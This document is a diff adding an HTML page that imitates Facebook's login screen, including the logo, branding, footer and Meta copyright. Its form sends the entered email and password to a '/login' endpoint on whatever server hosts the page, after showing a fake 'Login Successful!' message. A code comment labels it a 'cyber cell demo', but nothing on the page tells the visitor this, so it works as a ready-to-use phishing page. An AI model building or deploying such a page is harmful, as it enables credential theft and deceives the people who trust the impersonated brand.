@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook – log in or sign up</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/c/c2/F_icon.svg">
+    <style>
+        /* --- GLOBAL STYLES --- */
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        body {
+            font-family: "SFProDisplay-Regular", Helvetica, Arial, "sans-serif";
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.34;
+        }
+
+        /* --- LAYOUT (Desktop First) --- */
+        .main-wrapper {
+            display: flex; flex-direction: column; align-items: center;
+            padding-top: 72px; padding-bottom: 112px; min-height: 70vh;
+        }
+        .content-box {
+            display: flex; justify-content: space-between; width: 100%; max-width: 980px; margin: 0 auto; padding: 0 20px;
+        }
+
+        /* --- LEFT SIDE (Branding) --- */
+        .branding { width: 60%; padding-top: 112px; padding-right: 32px; }
+        
+        /* LOGO SIZE UPDATED HERE (Desktop) */
+        .branding img { 
+            height: 85px; /* Reduced from 106px */
+            margin: -20px; /* Adjusted margin */
+        }
+        
+        .branding h2 {
+            font-family: "SFProDisplay-Regular", Helvetica, Arial, "sans-serif";
+            font-size: 28px; font-weight: normal; line-height: 32px;
+            margin-top: 24px; padding-bottom: 20px;
+        }
+
+        /* --- RIGHT SIDE (Login Form) --- */
+        .login-container { width: 40%; max-width: 396px; display: flex; flex-direction: column; align-items: center; }
+        .card {
+            background-color: #fff; border: none; border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px; width: 100%; text-align: center; margin-bottom: 24px;
+            position: relative;
+        }
+
+        .input-group { margin-bottom: 12px; }
+        input {
+            width: 100%; font-size: 17px; padding: 14px 16px;
+            border: 1px solid #dddfe2; border-radius: 6px; color: #1d2129; outline: none;
+        }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+
+        /* Button & Spinner */
+        .btn-login {
+            background-color: #1877f2; border: none; border-radius: 6px;
+            font-size: 20px; line-height: 48px; padding: 0 16px; width: 100%;
+            color: #fff; font-weight: bold; cursor: pointer; margin-top: 6px; transition: 0.2s;
+            position: relative;
+        }
+        .btn-login:hover { background-color: #166fe5; }
+        
+        .btn-spinner {
+            display: none; width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite;
+            position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
+        }
+        @keyframes spin { to { transform: translate(-50%, -50%) rotate(360deg); } }
+
+        /* Links */
+        .forgot { color: #1877f2; font-size: 14px; font-weight: 500; text-decoration: none; margin-top: 16px; margin-bottom: 20px; display: inline-block; }
+        .forgot:hover { text-decoration: underline; }
+        .divider { border-bottom: 1px solid #dadde1; margin: 0 0 20px 0; }
+        
+        .btn-new {
+            background-color: #42b72a; border: none; border-radius: 6px;
+            font-size: 17px; line-height: 48px; padding: 0 16px; color: #fff;
+            font-weight: bold; cursor: pointer; transition: 0.2s; margin-bottom: 6px;
+        }
+        .btn-new:hover { background-color: #36a420; }
+        
+        .create-page { font-size: 14px; color: #1c1e21; }
+        .create-page a { text-decoration: none; color: #1c1e21; font-weight: bold; }
+        .create-page a:hover { text-decoration: underline; }
+
+        /* Not Found Error (Demo purpose) */
+        .error-message { color: #f02849; font-size: 13px; margin-bottom: 10px; text-align: left; display: none; }
+        input.error { border-color: #f02849; }
+
+        /* --- SUCCESS STATE --- */
+        .success-state { display: none; text-align: center; padding: 20px 0; animation: fadeIn 0.5s ease; }
+        .success-check { color: #42b72a; font-size: 48px; margin-bottom: 16px; animation: scaleIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes scaleIn { from { transform: scale(0); } to { transform: scale(1); } }
+
+        /* --- FOOTER --- */
+        footer { background: #fff; padding-top: 20px; width: 100%; color: #737373; }
+        .footer-wrapper { max-width: 980px; margin: 0 auto; padding: 0 20px; }
+        .footer-langs { display: flex; flex-wrap: wrap; align-items: center; padding-bottom: 10px; border-bottom: 1px solid #dddfe2; font-size: 12px; }
+        .footer-langs a { color: #8a8d91; text-decoration: none; margin-right: 10px; margin-bottom: 5px; }
+        .footer-links { padding-top: 10px; margin-bottom: 20px; display: flex; flex-wrap: wrap; font-size: 12px; line-height: 20px; }
+        .footer-links a { color: #8a8d91; text-decoration: none; margin-right: 20px; white-space: nowrap; }
+        .copyright { font-size: 11px; color: #737373; margin-top: 20px; margin-bottom: 20px; }
+
+        /* --- RESPONSIVE DESIGN (Mobile Friendly) --- */
+        
+        /* Tablets & Smaller Laptops */
+        @media (max-width: 900px) {
+            .content-box { flex-direction: column; align-items: center; padding: 0 40px; }
+            .branding { width: 100%; text-align: center; padding-top: 40px; padding-right: 0; margin-bottom: 30px; }
+            .branding h2 { font-size: 24px; }
+            .branding img { height: 75px; margin: -15px auto; } /* Smaller logo for tablet */
+            .login-container { width: 100%; }
+        }
+
+        /* Mobile Phones (The real mobile friendly part) */
+        @media (max-width: 480px) {
+            .main-wrapper { padding-top: 20px; padding-bottom: 40px; }
+            .content-box { padding: 0 16px; }
+            .branding { padding-top: 10px; margin-bottom: 20px; }
+            /* MUCH SMALLER LOGO FOR MOBILE */
+            .branding img { 
+                height: 60px; 
+                margin: -10px auto; 
+            }
+            .branding h2 { font-size: 18px; line-height: 22px; margin-top: 10px; }
+            .card { padding: 16px; }
+            input { padding: 12px; font-size: 16px; } /* Prevents zoom on iOS */
+            .btn-login { font-size: 18px; line-height: 40px; }
+            footer { display: none; /* Optional: Hide complex footer on very small mobile for cleaner look */ }
+        }
+    </style>
+    <script>
+        // --- SAME CYBER CELL DEMO LOGIC AS BEFORE ---
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('loginForm');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const loginButton = document.getElementById('loginBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            const errorMessage = document.getElementById('errorMsg');
+            const formContent = document.getElementById('formContent');
+            const successState = document.getElementById('successState');
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                let isValid = true;
+                emailInput.classList.remove('error');
+                passwordInput.classList.remove('error');
+                errorMessage.style.display = 'none';
+
+                if (!emailInput.value.trim()) { emailInput.classList.add('error'); isValid = false; }
+                if (!passwordInput.value.trim()) { passwordInput.classList.add('error'); isValid = false; }
+
+                if (!isValid) {
+                    errorMessage.textContent = 'The email address or mobile number you entered isn\'t connected to an account.';
+                    errorMessage.style.display = 'block';
+                    return;
+                }
+
+                // Start Demo Loading
+                loginButton.disabled = true;
+                btnText.style.display = 'none';
+                spinner.style.display = 'block';
+
+                setTimeout(() => {
+                    // Show Success
+                    formContent.style.display = 'none';
+                    successState.style.display = 'block';
+
+                    // Final Submit to action="/login"
+                    setTimeout(() => {
+                        form.submit();
+                    }, 2000);
+
+                }, 1500);
+            });
+        });
+    </script>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <div class="content-box">
+            <div class="branding">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Facebook_Logo_%282019%29.svg" alt="Facebook">
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+
+            <div class="login-container">
+                <div class="card">
+                    <form id="loginForm" action="/login" method="POST">
+                        <div id="formContent">
+                            <div class="error-message" id="errorMsg"></div>
+                            <div class="input-group"><input type="text" id="email" name="email" placeholder="Email address or phone number"></div>
+                            <div class="input-group"><input type="password" id="password" name="password" placeholder="Password"></div>
+                            <button type="submit" class="btn-login" id="loginBtn">
+                                <span id="btnText">Log In</span>
+                                <div class="btn-spinner" id="spinner"></div>
+                            </button>
+                            <a href="#" class="forgot">Forgotten password?</a>
+                            <div class="divider"></div>
+                            <button type="button" class="btn-new">Create new account</button>
+                        </div>
+
+                        <div id="successState" class="success-state">
+                            <div class="success-check">✓</div>
+                            <h3>Login Successful!</h3>
+                            <p style="color: #65676b; margin-top: 5px;">Redirecting...</p>
+                        </div>
+                    </form>
+                </div>
+                <div class="create-page"><a href="#">Create a Page</a> for a celebrity, brand or business.</div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-wrapper">
+            <div class="footer-langs">
+                <a href="#">English (UK)</a><a href="#">हिन्दी</a><a href="#">मराठी</a><a href="#">اردو</a><a href="#">ਪੰਜਾਬੀ</a><a href="#">বাংলা</a><a href="#">ગુજરાતી</a><a href="#">தமிழ்</a><a href="#">తెలుగు</a><a href="#">മലയാളം</a><a href="#">ಕನ್ನಡ</a>
+            </div>
+            <div class="footer-links">
+                <a href="#">Sign Up</a><a href="#">Log In</a><a href="#">Messenger</a><a href="#">Facebook Lite</a><a href="#">Video</a><a href="#">Places</a><a href="#">Games</a><a href="#">Marketplace</a><a href="#">Meta Pay</a><a href="#">Meta Store</a><a href="#">Instagram</a><a href="#">Threads</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Help</a>
+            </div>
+            <div class="copyright">Meta © 2026</div>
+        </div>
+    </footer>
+
+</body>
+</html>
